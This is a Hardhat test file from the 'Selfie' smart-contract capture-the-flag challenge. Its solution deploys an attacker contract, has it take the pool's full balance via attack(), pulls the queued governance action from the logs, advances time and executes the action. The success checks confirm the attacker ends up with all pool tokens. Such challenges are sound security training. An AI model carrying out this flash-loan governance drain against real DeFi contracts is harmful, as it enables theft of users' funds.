const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const attackerCF = await ethers.getContractFactory('SelfieAttacker', attacker);
        const attackContract = await attackerCF.deploy(this.pool.address, this.governance.address);

        let tx = await attackContract.connect(attacker).attack(TOKENS_IN_POOL);
        const recp = await tx.wait();

        // get the actionId
        const iface = this.governance.interface;
        const aqTopic = iface.getEventTopic('ActionQueued');
        let actionId;
        for(let i=0;i<recp.logs.length;i++){
            if(recp.logs[i].topics[0]==aqTopic){
                const res = iface.decodeEventLog('ActionQueued', recp.logs[i].data);
                actionId = res.actionId;
                break;
            }
        }

        // console.log('actionId:', actionId);
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        // exec action
        tx = await this.governance.executeAction(actionId);
        await tx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
